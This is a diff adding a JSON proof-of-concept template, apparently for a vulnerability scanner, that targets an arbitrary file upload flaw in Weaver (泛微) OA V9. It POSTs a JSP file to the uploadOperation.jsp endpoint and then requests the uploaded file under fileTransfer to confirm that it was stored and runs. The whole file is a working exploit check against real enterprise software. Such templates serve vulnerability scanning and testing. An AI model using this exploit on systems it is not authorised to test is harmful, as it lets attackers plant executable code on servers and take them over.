@@ -1,0 +1,57 @@
+{
+    "Name": "泛微OA V9 任意文件上传",
+    "Description": "泛微OA V9 任意文件上传",
+    "Product": "泛微",
+    "author": "chumeng",
+    "Request":[
+        {
+        "Method": "POST",
+        "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"},
+        "Uri":"/page/exportImport/uploadOperation.jsp",
+        "Port":"",
+        "Data":"",
+        "follow_redirects":"false",
+        "Upload":{"Name": "file","fileName": "chumeng.jsp","filePath": "resource/chumeng.jsp" },
+        "Response":{
+            "Check_Steps":"AND",
+            "Checks": [
+                    {
+                    "Operation": "contains", 
+                    "Key":"",
+                    "Value": "renyizifumofamen"
+                    },
+                     {
+                    "Operation": "code", 
+                    "Key":"",
+                    "Value": "200"  
+                     }
+            ]
+            },
+            "Next_decide":"AND"
+            },
+             {
+            "Method": "GET",
+            "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"},
+            "Uri":"/page/exportImport/fileTransfer/chumeng.jsp",
+            "Port":"",
+            "Data":"",
+            "follow_redirects":"false",
+            "Upload":{"Name": "","fileName": "","filePath": "" },
+            "Response":{
+                "Check_Steps":"AND",
+                "Checks": [
+                        {
+                        "Operation": "contains", 
+                        "Key":"",
+                        "Value": "chumeng12123"
+                        },
+                         {
+                        "Operation": "code", 
+                        "Key":"",
+                        "Value": "200"  
+                         }
+                ]
+                },
+                "Next_decide":""
+             }
+    ]}
